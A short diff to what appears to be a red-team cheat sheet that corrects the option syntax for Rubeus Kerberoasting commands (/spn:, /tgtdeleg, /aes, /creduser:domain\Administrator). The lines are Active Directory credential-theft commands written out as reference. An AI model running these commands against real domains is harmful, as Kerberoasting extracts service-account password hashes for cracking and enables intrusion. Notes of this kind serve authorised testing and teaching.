@@ -742,9 +742,9 @@ https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
 
 ```.\Rubeus.exe kerberoast```
 
-- ```\spn:```
-- ```\tgtdeleg```
-- ```\aes```
+- ```/spn:```
+- ```/tgtdeleg```
+- ```/aes```
 - ```/creduser:domain\Administrator``` and ```/credpassword:```
 
 - ```/simple /nowrap```
